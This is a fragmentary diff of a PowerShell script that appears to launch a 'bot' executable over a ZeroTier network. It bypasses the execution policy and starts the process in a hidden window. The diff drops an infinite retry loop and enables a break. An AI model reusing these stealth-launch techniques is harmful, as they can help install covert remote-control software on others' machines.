@@ -1,4 +1,3 @@
-while ($true) {
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 $retryAttempts = 5
 $ztservice = "ZeroTierOneService"
@@ -39,6 +38,7 @@ if (Test-Path $botpath) {
         $programHash = $matches[1]
     }
     if ($programHash -eq $existingFileHash) {
+        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
     } else {
         Remove-Item -Path $botpath -Force
     }
@@ -347,10 +347,8 @@ if ($storedCode -ne $null) {
      			Start-Process -WindowStyle Hidden -FilePath $botpath -ArgumentList $combineddata
 			Start-Sleep 3
 		}
-                #break
+                break
             }
         }
     }
 } else {}
-Start-Sleep -Seconds 300
-}
